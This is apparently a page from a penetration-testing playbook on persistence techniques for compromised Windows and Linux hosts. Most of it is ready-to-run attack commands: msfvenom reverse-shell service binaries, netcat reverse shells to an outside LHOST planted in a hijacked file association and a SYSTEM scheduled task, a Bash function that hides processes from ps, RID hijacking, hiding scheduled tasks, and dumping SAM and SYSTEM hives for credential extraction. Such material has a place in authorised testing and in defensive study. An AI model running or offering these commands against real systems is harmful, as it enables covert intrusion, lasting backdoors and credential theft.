# 5.1 Persistence

## Table of Contents

- [Alternate Data Stream Files (ADS)](https://github.com/Invicta-Solutions-Group/ISG_PenTest-Playbook/blob/main/5-Installation/5.1-Persistence.md#Alternate-Data-Stream-Files-ADS)
- [Backdoor Services](https://github.com/Invicta-Solutions-Group/ISG_PenTest-Playbook/blob/main/5-Installation/5.1-Persistence.md#Backdoor-Services)
- [Bash Backdoor](https://github.com/Invicta-Solutions-Group/ISG_PenTest-Playbook/blob/main/5-Installation/5.1-Persistence.md#Bash-Backdoor)
- [Hijack File Associations](https://github.com/Invicta-Solutions-Group/ISG_PenTest-Playbook/blob/main/5-Installation/5.1-Persistence.md#Hijacking-File-Associations)
- [Logon Triggered Persistence](https://github.com/Invicta-Solutions-Group/ISG_PenTest-Playbook/blob/main/5-Installation/5.1-Persistence.md#Logon-Triggered-Persistence)
- [Normal.dotm](https://github.com/Invicta-Solutions-Group/ISG_PenTest-Playbook/blob/main/5-Installation/5.1-Persistence.md#Normaldotm)
- [Relative ID (RID) Hijacking](https://github.com/Invicta-Solutions-Group/ISG_PenTest-Playbook/blob/main/5-Installation/5.1-Persistence.md#Relative-ID-RID-Hijacking)
- [Scheduled Tasks](https://github.com/Invicta-Solutions-Group/ISG_PenTest-Playbook/blob/main/5-Installation/5.1-Persistence.md#Scheduled-Tasks)
- [Special Privileges and Security Descriptors](https://github.com/Invicta-Solutions-Group/ISG_PenTest-Playbook/blob/main/5-Installation/5.1-Persistence.md#Special-Privileges-and-Security-Descriptors)
- [User Group Manipulation](https://github.com/Invicta-Solutions-Group/ISG_PenTest-Playbook/blob/main/5-Installation/5.1-Persistence.md#User-Group-Manipulation)

## Alternate Data Stream Files (ADS)

```c
C:\> echo <PAYLOAD> > %USERPROFILE%\AppData:<FILE>
```

<p align="center">
  <img src="https://github.com/Invicta-Solutions-Group/ISG_PenTest-Playbook/blob/main/5-Installation/files/ads1.png">
</p>

### Listing ADS Files

```c
C:\> dir /r /a %USERPROFILE%\AppData\
```

### Deleting ADS Files

> https://live.sysinternals.com/

```c
C:\> .\streams64.exe -s C:\PATH\TO\FOLDER\
C:\> .\streams64.exe -d C:\PATH\TO\FOLDER\
```

<p align="center">
  <img src="https://github.com/Invicta-Solutions-Group/ISG_PenTest-Playbook/blob/main/5-Installation/files/ads2.png">
</p>

## Backdoor Services

### User Password Reset

Reset a users `password`.

```c
C:\> sc.exe create <SERVICE_NAME> binPath= "net user <USERNAME> <PASSWORD>" start= auto
C:\> sc.exe start <SERVICE_NAME>
```

### Reverse Shell Services

Create a `reverse shell` to be triggert by the service.

```c
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe-service -o <FILE>.exe
```

```c
C:\> sc create <SERVICE_NAME> binPath= "C:\Windows\<FILE>.exe" start= auto
```

```c
C:\> sc start <SERVICE_NAME>
```

### Modifying existing services.

```c
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe-service -o <FILE>.exe
```

```c
C:\> sc query state=all
```

```c
C:\> sc config <SERVICE_NAME> binPath= "C:\Windows\<FILE>.exe" start= auto obj= "LocalSystem"
```

```c
C:\> sc qc <SERVICE_NAME>
```

```c
C:\> sc start <SERVICE_NAME>
```

## Bash Backdoor

This is an old Linux trick executed in `Bash` that simply `over-mounts` a particular `PID` in `/proc` with a useless, empty directory, so that `/proc/<PID>` doesn't get populated with the usual process information (invisible to the `ps` command, for example).
Requires `root` permissions; either execute it in your shell or slap it into `/root/.bashrc`.

Thanks to Alh4zr3d and THC for sharing!

```c
hide()
{
[[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
_pid=${1:-$$}
[[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[Backdoor] PID $_pid is now hidden"; return; }
local _argstr
for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
[[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
}
```

### Examples

- Hide the current shell/PID: `hide`
- Hide process with pid 31337: `hide 31337`
- Hide `sleep 1234`: hide sleep 1234
- Start and hide `sleep 1234` as a background process: `hide nohup sleep 1234 &>/dev/null &`

## Hijacking File Associations

Registry Path.

```c
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\
```

Now search for the desired `file extention` and change the `Programmatic ID (ProgID)`.

```c
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command
```

Then build a `PowerShell Script` and place it anywhere on the target.

```c
Start-Process -NoNewWindow "C:\temp\nc64.exe" "-e cmd.exe <LHOST> <LPORT>"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Next change the `Registry Key` to point to the script.

```c
powershell -windowstyle hidden C:\Windows\System32\<FILE>.ps1 %1
```

## Logon Triggered Persistence

### Execute after Logon

Base path for `executables` which should run on `user login`.

```c
C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

The path for all users it is the following one.

```c
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

### Run / RunOnce

Execution on logon can also be achieved via `registry key`.

```c
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\SOFTWARE\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\SOFTWARE\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Windows\CurrentVersion\RunOnce
```

Creating a new `REG_EXPAND_SZ` entry with a path to the file which should be executed after loggin in, will do the job.

### Abusing Winlogon

An alternative would be using the `Windows component` which is loading the `user profile`.

```c
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

Code execution can be achived by `appending` commands to either `Shell` or `Userinit` entries.

```c
C:\Windows\System32\userinit.exe, C:\Windows\<FILE>
```

### Abusing Logon Scripts

When `userinit.exe` is loading the `user profile`, it also checks a `environment variable` called `UserInitMprLogonScript`.

The variable is `not set` by `default`, which means it can be created and pointed to a file which should be executed.

```c
HKEY_CURRENT_USER\Environment
```

Create an new `REG_EXPAND_SZ` entry, named as `UserInitMprLogonScript` and the path to the malicious file.

## Normal.dotm

Add a macro to the `Normal.dotm` which get's executed whenever `any` document is opened.

## Relative ID (RID) Hijacking

Get the current `RIDs`.

```c
PS C:\> wmic useraccount get name,sid
```

```c
Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
```

Edit the `registry` by using `PsExec64.exe` to add the `RID` of `500`, which is a `Local Administrator` to another user.

```c
PS C:\> PsExec64.exe -i -s regedit
```

Path in Registry.

```c
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\
```

Under the corresponding key, there will be a vlaue called `F`, which holds the user's effective `RID`. Those are stored
by using `little-endian` notation, so the bytes appear `reversed`.

```c
500 = 0x01F4
```

Switched Bytes.

```c
F401
```

Save it and on the next login, the user should get `RID 500` assigned.

## Scheduled Tasks

```c
C:\> schtasks /create /sc minute /mo 1 /tn <TASK_NAME> /tr "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>" /ru SYSTEM
```

```c
C:\> schtasks /query /tn <TASK_NAME>
```

### Hide malicious Tasks

Open the follwing path in the registry.

```c
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
```

Then delete the `security descriptor` for the task.

## Special Privileges and Security Descriptors

### Edit Special Privileges

Add `SeBackupPrivilege` and `SeRestore Privilege` to a user.

Export the configuration file.

```c
PS C:\> secedit /export /cfg config.inf
```

Edit the file and add the `username`.

```c
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551,<USERNAME>
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551,<USERNAME>
```

Convert the `.inf` file into a `.sdb` file and load the configuration back into the system.

```c
PS C:\> secedit /import /cfg config.inf /db config.sdb
PS C:\> secedit /configure /db config.sdb /cfg config.inf
```

### Enable WinRM Security Descriptor

Open the `permission window` and add a user, which should granted `Full Control` in order to `remote login`.

```c
PS C:\> Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

## User Group Manipulation

Add user to `Local Administrators` group.

```c
PS C:\> net localgroup administrators <USERNAME> /add
```

Add user to `Backup Operators` group.

```c
PS C:\> net localgroup "Backup Operators" <USERNAME> /add
```

Add user to `Remote Desktop Users` group.

```c
PS C:\> net localgroup "Remote Management Users" <USERNAME> /add
```

Disable `LocalAccountTokenFilterPolicy`.

```c
PS C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Dumping `SAM` and `SYSTEM` files with `Backup Operator` privileges.

```c
PS C:\> reg save hklm\system system.bak
```

```c
PS C:\> reg save hklm\sam sam.bak
```

```c
$ impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

### Previous

- [5 Installation](https://github.com/Invicta-Solutions-Group/ISG_PenTest-Playbook/blob/main/5-Installation/5-Installation.md)

### Next

- [5.2 Situational Awareness](https://github.com/Invicta-Solutions-Group/ISG_PenTest-Playbook/blob/main/5-Installation/5.2-Situational-Awareness.md)
